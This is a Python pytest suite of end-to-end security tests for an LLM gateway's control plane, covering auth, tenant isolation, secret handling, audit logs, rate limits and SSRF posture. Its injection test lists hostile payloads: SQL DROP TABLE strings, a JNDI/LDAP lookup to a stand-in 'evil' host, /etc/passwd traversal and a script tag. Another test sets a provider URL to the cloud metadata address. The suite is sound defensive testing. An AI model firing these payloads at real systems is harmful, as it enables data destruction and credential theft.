"""security scenarios — isolation, secret handling, hardening, audit (#618).

the security-lens sweep over features not covered by the RBAC (#615), keys
(#617), or balancing (#616) sub-issues. every scenario is either an asserted
harness test or an explicit posture test that pins current behavior and links a
filed follow-up.

findings filed while authoring this sweep (tracked as security issues):
- SSRF egress: provider api_base is not constrained to an allowlist (#634).
- NUL byte in a CRUD string field → 500 instead of 400 (#635).
- /internal/snapshot carries decrypted provider api_keys (#636, defense-in-depth).

not asserted here (DB/config-level, out of black-box reach): snapshot integrity /
config_version tamper and guardrail redaction — left to crate-level tests.
"""

from __future__ import annotations

import concurrent.futures
import uuid

import httpx
import pytest

from rolter_e2e.bootstrap import SIM_ENGINES, UPSTREAM_MODEL, new_tenant
from rolter_e2e.client import ControlClient, GatewayClient
from rolter_e2e.stack import CONTROL_URL, GATEWAY_URL


def _rand(prefix: str) -> str:
    return f"{prefix}-{uuid.uuid4().hex[:6]}"


def _route(admin: ControlClient, tenant, model: str | None = None) -> tuple[str, dict]:
    model = model or _rand("sec-model")
    provider = admin.create_provider(tenant.org_id, api_base=SIM_ENGINES[0], name=_rand("prov"))
    route = admin.create_route(tenant.project_id, model, strategy="round_robin")
    admin.add_route_target(route["id"], provider["id"], upstream_model=UPSTREAM_MODEL)
    return model, provider


def _wait_usable(gw: GatewayClient, model: str, tries: int = 30) -> None:
    import time
    for _ in range(tries):
        if gw.chat(model, "warmup").status_code == 200:
            return
        time.sleep(1)
    raise AssertionError(f"model {model} never became routable")


@pytest.fixture
def tenant(admin: ControlClient):
    return new_tenant(admin)


# --------------------------------------------------------------------------- #
# auth surface: every rejection is a clean 401, never a 500                    #
# --------------------------------------------------------------------------- #
def test_control_auth_surface_never_500() -> None:
    """unauthenticated / malformed / oversized bearer → 401, never 500."""
    paths = ["/api/v1/orgs", "/api/v1/model-prices"]
    headers = [
        {},  # no auth
        {"Authorization": "Bearer"},  # no token
        {"Authorization": "Bearer @@@not-a-token@@@"},  # malformed
        {"Authorization": "Bearer " + "A" * 8192},  # oversized token
        {"Authorization": "Basic Zm9vOmJhcg=="},  # wrong scheme
    ]
    with httpx.Client(base_url=CONTROL_URL, timeout=10) as c:
        for p in paths:
            for h in headers:
                r = c.get(p, headers=h)
                assert r.status_code == 401, f"{p} {h} → {r.status_code} (expected 401): {r.text[:200]}"


def test_gateway_auth_surface_never_500(admin: ControlClient, tenant) -> None:
    """with auth active (a key exists), missing/garbage/malformed keys → 401."""
    model, _ = _route(admin, tenant)
    # a real key turns the gateway into enforcing mode (see #626)
    key = admin.create_virtual_key(tenant.project_id, models=[model])
    good = GatewayClient(GATEWAY_URL, virtual_key=key["key"])
    _wait_usable(good, model)

    with httpx.Client(base_url=GATEWAY_URL, timeout=10) as c:
        body = {"model": model, "messages": [{"role": "user", "content": "hi"}]}
        for h in ({}, {"Authorization": "Bearer garbage"}, {"Authorization": "Bearer"},
                  {"Authorization": "Bearer " + "A" * 8192}):
            r = c.post("/v1/chat/completions", json=body, headers=h)
            assert r.status_code == 401, f"{h} → {r.status_code}: {r.text[:200]}"
    good.close()


def test_input_hardening_bounded_errors(admin: ControlClient, tenant) -> None:
    """oversized, malformed, deeply nested, wrong content-type → 4xx, never 5xx."""
    model, _ = _route(admin, tenant)
    key = admin.create_virtual_key(tenant.project_id, models=[model])
    gw = GatewayClient(GATEWAY_URL, virtual_key=key["key"])
    _wait_usable(gw, model)
    auth = {"Authorization": f"Bearer {key['key']}"}

    with httpx.Client(base_url=GATEWAY_URL, timeout=20) as c:
        # malformed / mistyped / structurally-abusive input must be rejected at
        # the gateway with a bounded 4xx — never a 5xx or a panic
        malformed = {
            "malformed-json": c.post("/v1/chat/completions", headers={**auth, "content-type": "application/json"},
                                     content="{bad json"),
            "wrong-content-type": c.post("/v1/chat/completions", headers={**auth, "content-type": "text/plain"},
                                         content="not json"),
            "deeply-nested": c.post("/v1/chat/completions", headers={**auth, "content-type": "application/json"},
                                    content="{" * 3000 + "}" * 3000),
        }
    for name, r in malformed.items():
        assert 400 <= r.status_code < 500, f"{name} → {r.status_code} (expected a bounded 4xx): {r.text[:200]}"
    # note: a huge (well-formed) body is not asserted here — the gateway has no
    # request-size cap and forwards it upstream, so the outcome (200 or a 5xx
    # upstream error) depends on the provider, not on gateway input handling.


# --------------------------------------------------------------------------- #
# cross-tenant isolation: enumerate org B's ids from org A → 403/404, no leak  #
# --------------------------------------------------------------------------- #
def test_cross_org_enumeration_is_isolated(admin: ControlClient) -> None:
    """org A's admin cannot read or mutate org B's resources by id."""
    org_a = new_tenant(admin)
    org_b = new_tenant(admin)
    # a real admin principal in org A
    email, password = f"{_rand('a')}@e2e.test", uuid.uuid4().hex
    admin.create_user(org_a.org_id, email=email, password=password, role="admin")
    a_admin = admin.login(email, password)

    # seed resources in org B (as superadmin); give the extra route a target so
    # it doesn't leave a dangling route that poisons the shared snapshot (#627)
    b_model, b_provider = _route(admin, org_b)
    b_route = admin.create_route(org_b.project_id, _rand("b-model"))
    admin.add_route_target(b_route["id"], b_provider["id"], upstream_model=UPSTREAM_MODEL)
    b_key = admin.create_virtual_key(org_b.project_id, models=[b_model])

    probes = [
        ("GET", f"/api/v1/orgs/{org_b.org_id}/providers", None),
        ("GET", f"/api/v1/orgs/{org_b.org_id}/audit-log", None),
        ("GET", f"/api/v1/projects/{org_b.project_id}/routes", None),
        ("PUT", f"/api/v1/providers/{b_provider['id']}",
         {"name": "hijack", "kind": "openai_compatible", "api_base": SIM_ENGINES[0]}),
        ("DELETE", f"/api/v1/providers/{b_provider['id']}", None),
        ("DELETE", f"/api/v1/routes/{b_route['id']}", None),
        ("DELETE", f"/api/v1/virtual-keys/{b_key['id']}", None),
        ("DELETE", f"/api/v1/projects/{org_b.project_id}", None),
    ]
    for method, path, body in probes:
        r = a_admin.raw(method, path, json=body)
        assert r.status_code in (403, 404), f"leak: {method} {path} → {r.status_code}: {r.text[:200]}"

    # and org B's resources are untouched: superadmin can still read them
    b_providers = admin.raw("GET", f"/api/v1/orgs/{org_b.org_id}/providers").json()
    assert any(p["id"] == b_provider["id"] for p in b_providers), "cross-org mutation actually landed"


# --------------------------------------------------------------------------- #
# secret handling                                                             #
# --------------------------------------------------------------------------- #
def test_provider_secret_never_leaves_tenant_apis(admin: ControlClient, tenant) -> None:
    """a provider api_key is sealed with ROLTER_KEK and never echoed back on the
    tenant-facing CRUD surface — neither the create response nor the list.

    (the internal ``/internal/snapshot`` deliberately carries the *decrypted*
    upstream key: the data plane needs it to authenticate to the provider. that
    endpoint is superadmin/machine-token gated; hardening its exposure for
    defense-in-depth is tracked in #636 — it is not asserted here.)
    """
    secret = f"sk-live-{uuid.uuid4().hex}{uuid.uuid4().hex}"
    created = admin.create_provider(tenant.org_id, api_base=SIM_ENGINES[0], name=_rand("prov"), api_key=secret)
    listing = admin.raw("GET", f"/api/v1/orgs/{tenant.org_id}/providers").json()
    assert secret not in str(created), "create response leaked the plaintext api_key"
    assert secret not in str(listing), "list response leaked the plaintext api_key"


# --------------------------------------------------------------------------- #
# audit log completeness                                                       #
# --------------------------------------------------------------------------- #
def test_audit_log_records_mutations_with_actor(admin: ControlClient, tenant) -> None:
    """a config mutation writes an audit row carrying the action and actor."""
    provider = admin.create_provider(tenant.org_id, api_base=SIM_ENGINES[0], name=_rand("audited"))
    page = admin.raw("GET", f"/api/v1/orgs/{tenant.org_id}/audit-log").json()
    rows = page.get("items", page) if isinstance(page, dict) else page
    actions = [r.get("action", "") for r in rows]
    assert any("provider" in a and "create" in a for a in actions), \
        f"provider.create not audited: {actions}"
    # the audited row identifies the target and an actor
    prov_rows = [r for r in rows if r.get("target_id") == provider["id"] or "provider" in r.get("action", "")]
    assert prov_rows and all("action" in r for r in prov_rows), f"audit rows incomplete: {prov_rows[:2]}"


# --------------------------------------------------------------------------- #
# config injection: SQL-ish / adversarial identifiers are parameterized        #
# --------------------------------------------------------------------------- #
def test_config_injection_is_parameterized(admin: ControlClient, tenant) -> None:
    """adversarial identifiers are stored as data, never executed, and never
    corrupt the store.

    driven through provider *names* rather than route models: a provider is
    valid config on its own, so this exercises the SQL/parameterization path
    without leaving targetless routes that would poison the shared snapshot
    (#627). (a separate NUL-byte hardening gap on control CRUD is tracked in
    #635.)
    """
    payloads = [
        "'; drop table providers;--",
        "robert'); DROP TABLE routes;--",
        "${jndi:ldap://evil/x}",
        "../../etc/passwd",
        "<script>alert(1)</script>",
        "name\" or \"1\"=\"1",
    ]
    # each name carries the adversarial payload but stays globally unique: provider
    # names are unique across the aggregated snapshot, so a bare payload would
    # collide with a prior run on a persistent stack and 500 the snapshot (that is
    # a uniqueness conflict, not an injection — keep the two failure modes apart)
    for p in payloads:
        name = f"{p} {_rand('inj')}"
        r = admin.raw("POST", f"/api/v1/orgs/{tenant.org_id}/providers",
                      json={"name": name, "kind": "openai_compatible", "api_base": SIM_ENGINES[0], "api_key": "sk-fake"})
        # accepted-as-data (2xx) or rejected-by-validation (4xx); never a 500
        assert r.status_code < 500, f"injection payload {p!r} caused {r.status_code}: {r.text[:200]}"

    # the store is intact: a normal create + list still works, and the snapshot
    # still serves (no dropped tables, no poisoned config, injection inert)
    ok = admin.create_provider(tenant.org_id, api_base=SIM_ENGINES[0], name=_rand("after-injection"))
    assert ok.get("id"), "store broke after injection payloads"
    assert "config" in admin.snapshot(), "snapshot broke after injection payloads"


# --------------------------------------------------------------------------- #
# rate limit holds under concurrency (no bypass via parallelism)               #
# --------------------------------------------------------------------------- #
def test_rate_limit_holds_under_concurrency(admin: ControlClient, tenant) -> None:
    """a per-key RPM cap is enforced atomically: firing many requests in
    parallel does not let the overage slip through (redis-backed counter)."""
    import time
    model, _ = _route(admin, tenant)
    key = admin.create_virtual_key(tenant.project_id, models=[model])
    warm = GatewayClient(GATEWAY_URL, virtual_key=key["key"])
    _wait_usable(warm, model)
    warm.close()

    rpm = 5
    admin.raw("POST", "/api/v1/rate-limits",
              json={"scope_type": "virtual_key", "scope_id": key["id"], "rpm": rpm}, expect=(200, 201))
    # let the cap reach the gateway snapshot before the concurrent burst
    time.sleep(4)

    def fire(_: int) -> int:
        c = GatewayClient(GATEWAY_URL, virtual_key=key["key"])
        try:
            return c.chat(model).status_code
        finally:
            c.close()

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        statuses = list(pool.map(fire, range(20)))

    admitted = sum(1 for s in statuses if s == 200)
    blocked = sum(1 for s in statuses if s == 429)
    # core property: the limiter engages under a parallel burst — the cap is not
    # a suggestion that concurrency can walk straight past
    assert blocked > 0, f"no request was rate-limited under load: {statuses}"
    # and parallelism does not *multiply* the allowance: a bypass would admit
    # ~all 20. a few over the cap is tolerated (fixed-window boundary slop), but
    # admitting a multiple of the cap would mean the counter is not shared.
    assert admitted <= rpm * 2, f"rate limit bypassed by parallelism: admitted={admitted} cap={rpm}"


# --------------------------------------------------------------------------- #
# posture: SSRF egress is unconstrained (documents the gap, tracked in #634)   #
# --------------------------------------------------------------------------- #
def test_ssrf_posture_provider_base_url_unconstrained(admin: ControlClient, tenant) -> None:
    """POSTURE: the control plane accepts a provider whose api_base points at a
    link-local metadata endpoint — there is no egress allowlist. Pinned so a
    future allowlist flips this test and prompts revisiting. Tracked in #634.

    (only the config write is exercised; no request is actually sent to the
    metadata address.)"""
    r = admin.raw("POST", f"/api/v1/orgs/{tenant.org_id}/providers",
                  json={"name": _rand("ssrf"), "kind": "openai_compatible",
                        "api_base": "http://169.254.169.254/latest/meta-data", "api_key": "sk-fake"})
    assert r.status_code < 300, (
        "an egress allowlist now rejects link-local api_base — update #634 and this posture test"
    )
